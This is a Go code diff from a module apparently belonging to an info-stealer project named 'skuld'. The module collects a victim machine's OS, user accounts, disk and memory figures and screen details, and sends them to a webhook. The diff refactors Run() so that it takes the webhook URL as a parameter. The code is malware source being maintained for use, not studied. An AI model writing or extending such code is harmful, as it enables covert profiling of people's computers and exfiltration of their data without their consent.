@@ -10,12 +10,13 @@ import (
 	"strconv"
 	"strings"
 	"syscall"
+
 	"github.com/shirou/gopsutil/v3/disk"
 	"github.com/shirou/gopsutil/v3/mem"
 	"golang.org/x/sys/windows/registry"
+
 	"github.com/hackirby/skuld/utils/hardware"
 	"main.go/modules/requests"
-    "main.go/config"
 )
 
 func GetOS() string {
@@ -217,7 +218,7 @@ func GetScreens() []string {
 	return nil
 }
 
-func Run() {
+func Run(webhook string) {
 	users := strings.Join(hardware.GetUsers(), "\n")
 	if len(users) > 4096 {
 		users = "Too many users to display"
@@ -256,11 +257,7 @@ func Run() {
 		},
 	}, GetScreens()...)
 
-
-    for _, webhook := range webhooks.Webhooks {
-        	requests.Webhook(webhook, map[string]interface{}{
-	    	"embeds": []map[string]interface{}{},
-       	})
-    }
-
+	requests.Webhook(webhook, map[string]interface{}{
+		"embeds": []map[string]interface{}{},
+	})
 }
